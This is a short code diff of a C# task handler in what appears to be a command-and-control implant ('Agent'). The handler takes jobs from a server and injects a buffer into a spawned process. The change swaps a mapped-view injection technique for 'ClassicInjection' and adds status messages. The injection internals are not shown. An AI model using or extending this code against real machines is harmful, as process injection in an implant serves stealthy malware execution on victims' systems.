@@ -1,13 +1,7 @@
 ﻿using Agent.Interfaces;
 using System.Text.Json;
 using Agent.Models;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-using Microsoft.Win32.SafeHandles;
 using Agent.Utilities;
-using Agent.Techniques;
-using System.Text;
-using Agent.Utlities;
 
 namespace Agent
 {
@@ -21,7 +15,7 @@ namespace Agent
         {
             this.messageManager = messageManager;
             this.spawner = spawner;
-            this.technique = new InterProcessMappedView();
+            this.technique = new ClassicInjection();
         }
 
         public async Task Execute(ServerJob job)
@@ -50,8 +44,16 @@ namespace Agent
                 if(spawner.TryGetHandle(job.task.id, out var handle))
                 {
                     technique.Inject(buf, handle.DangerousGetHandle());
+                    messageManager.WriteLine("Injected", job.task.id, true);
+                    return;
                 }
+
+                messageManager.WriteLine("Failed to get handle", job.task.id, true);
+                return;
+
             }
+
+            messageManager.WriteLine("Process spawn failed.", job.task.id, true);
         }
     }
 }
